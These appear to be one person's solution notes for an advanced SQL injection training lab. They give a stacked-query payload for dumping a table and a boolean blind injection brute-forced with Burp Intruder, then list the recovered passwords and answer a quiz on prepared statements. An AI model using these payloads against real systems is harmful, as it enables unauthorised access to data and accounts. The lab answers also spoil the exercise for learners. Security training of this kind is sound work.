# SQL injection (advanced)

## Task 3

getting all data

```
'; SELECT * FROM user_system_data;--
```

password is passW0rD

## Task 5

```
tom' and substring(password,1,1) = 't
```

```
catch PUT response
```

```
sendto intruder and clear
```

```
change ...'t... to ...'pass_char
```

```
ADD (right bar)
```

```
Go to payload bar, brute forcer, min i max  at 1
```

```
positive letter has only gives response 406 in attack
```

```
login:tom
password:thisisasecretfortomonly
```

## Task 6 (Q&A)

1. What is the difference between a prepared statement and a statement?

Solution 4: A statement has got values instead of a prepared statement

2. Which one of the following characters is a placeholder for variables?

Solution 3: ?

3. How can prepared statements be faster than statements?

Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.

4. How can a prepared statement prevent SQL-Injection?

Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.

5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?

Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.
